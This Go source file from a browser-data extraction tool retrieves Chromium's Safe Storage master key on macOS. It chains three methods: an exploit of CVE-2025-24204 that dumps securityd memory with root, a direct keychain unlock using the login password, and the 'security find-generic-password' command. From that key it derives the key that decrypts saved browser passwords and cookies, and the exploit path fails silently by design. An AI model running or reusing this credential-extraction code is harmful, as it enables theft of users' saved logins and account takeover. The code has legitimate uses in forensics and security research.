//go:build darwin

package masterkey

import (
	"bytes"
	"context"
	"crypto/sha1"
	"errors"
	"fmt"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/moond4rk/keychainbreaker"

	"github.com/moond4rk/hackbrowserdata/log"
)

// https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_mac.mm;l=157
var darwinParams = pbkdf2Params{
	salt:       []byte("saltysalt"),
	iterations: 1003,
	keySize:    16,
	hashFunc:   sha1.New,
}

const securityCmdTimeout = 30 * time.Second

// GcoredumpRetriever extracts keychain secrets via CVE-2025-24204 (dumps securityd memory; needs root).
// Records are cached once (sync.Once) so the dump runs a single time across all browsers.
type GcoredumpRetriever struct {
	once    sync.Once
	records []keychainbreaker.GenericPassword
	err     error
}

// RetrieveKey returns (nil, nil) on failure so ChainRetriever falls through silently — the common
// "needs root" case isn't warning-worthy and would drown real warnings (same as ABERetriever).
func (r *GcoredumpRetriever) RetrieveKey(hints Hints) ([]byte, error) {
	r.once.Do(func() {
		r.records, r.err = DecryptKeychainRecords()
	})
	if r.err != nil {
		log.Debugf("gcoredump: %v", r.err)
		return nil, nil //nolint:nilerr // intentional silent fallthrough
	}

	key, err := findStorageKey(r.records, hints.KeychainLabel)
	if err != nil {
		log.Debugf("gcoredump: %v", err)
		return nil, nil //nolint:nilerr // intentional silent fallthrough
	}
	return key, nil
}

func loadKeychainRecords(password string) ([]keychainbreaker.GenericPassword, error) {
	kc, err := keychainbreaker.Open()
	if err != nil {
		return nil, fmt.Errorf("open keychain: %w", err)
	}
	if err := kc.Unlock(keychainbreaker.WithPassword(password)); err != nil {
		return nil, fmt.Errorf("unlock keychain: %w", err)
	}
	return kc.GenericPasswords()
}

func findStorageKey(records []keychainbreaker.GenericPassword, storage string) ([]byte, error) {
	for _, rec := range records {
		if rec.Account == storage {
			return darwinParams.deriveKey(rec.Password), nil
		}
	}
	return nil, fmt.Errorf("%q: %w", storage, errStorageNotFound)
}

// KeychainPasswordRetriever unlocks login.keychain-db with the macOS login password (no root).
// Records are cached once and reused across browsers.
type KeychainPasswordRetriever struct {
	Password string

	once    sync.Once
	records []keychainbreaker.GenericPassword
	err     error
}

func (r *KeychainPasswordRetriever) RetrieveKey(hints Hints) ([]byte, error) {
	if r.Password == "" {
		return nil, fmt.Errorf("keychain password not provided")
	}

	r.once.Do(func() {
		r.records, r.err = loadKeychainRecords(r.Password)
	})
	if r.err != nil {
		return nil, r.err
	}

	return findStorageKey(r.records, hints.KeychainLabel)
}

// SecurityCmdRetriever queries Keychain via the macOS `security` CLI (may prompt). Results are
// cached per storage name so each browser's key is fetched once.
type SecurityCmdRetriever struct {
	mu    sync.Mutex
	cache map[string]securityResult
}

type securityResult struct {
	key []byte
	err error
}

func (r *SecurityCmdRetriever) RetrieveKey(hints Hints) ([]byte, error) {
	storage := hints.KeychainLabel
	r.mu.Lock()
	defer r.mu.Unlock()

	if res, ok := r.cache[storage]; ok {
		return res.key, res.err
	}

	key, err := r.retrieveKeyOnce(storage)
	r.cache[storage] = securityResult{key: key, err: err}
	return key, err
}

func (r *SecurityCmdRetriever) retrieveKeyOnce(storage string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), securityCmdTimeout)
	defer cancel()

	var stdout, stderr bytes.Buffer
	cmd := exec.CommandContext(ctx, "security", "find-generic-password", "-wa", strings.TrimSpace(storage)) //nolint:gosec
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		if errors.Is(ctx.Err(), context.DeadlineExceeded) {
			return nil, fmt.Errorf("security command timed out after %s", securityCmdTimeout)
		}
		// `security` exits non-zero with empty stderr when the user denies the prompt or mistypes;
		// surface that instead of the cryptic "exit status 128 ()".
		stderrStr := strings.TrimSpace(stderr.String())
		if stderrStr == "" {
			return nil, fmt.Errorf("security command: %w (likely keychain access denied or wrong password)", err)
		}
		return nil, fmt.Errorf("security command: %w (%s)", err, stderrStr)
	}
	if stderr.Len() > 0 {
		return nil, fmt.Errorf("keychain: %s", strings.TrimSpace(stderr.String()))
	}

	secret := bytes.TrimSpace(stdout.Bytes())
	if len(secret) == 0 {
		return nil, fmt.Errorf("keychain: empty secret for %s", storage)
	}

	return darwinParams.deriveKey(secret), nil
}

// DefaultRetrievers wires the macOS V10 chain (the only tier Chromium uses here), first success wins:
//  1. GcoredumpRetriever        — CVE-2025-24204 exploit (root only)
//  2. KeychainPasswordRetriever — direct unlock, skipped when password is empty
//  3. SecurityCmdRetriever      — `security` CLI fallback (may prompt)
func DefaultRetrievers(keychainPassword string) Retrievers {
	chain := []Retriever{&GcoredumpRetriever{}}
	if keychainPassword != "" {
		chain = append(chain, &KeychainPasswordRetriever{Password: keychainPassword})
	}
	chain = append(chain, &SecurityCmdRetriever{cache: make(map[string]securityResult)})
	return Retrievers{V10: NewChain(chain...)}
}
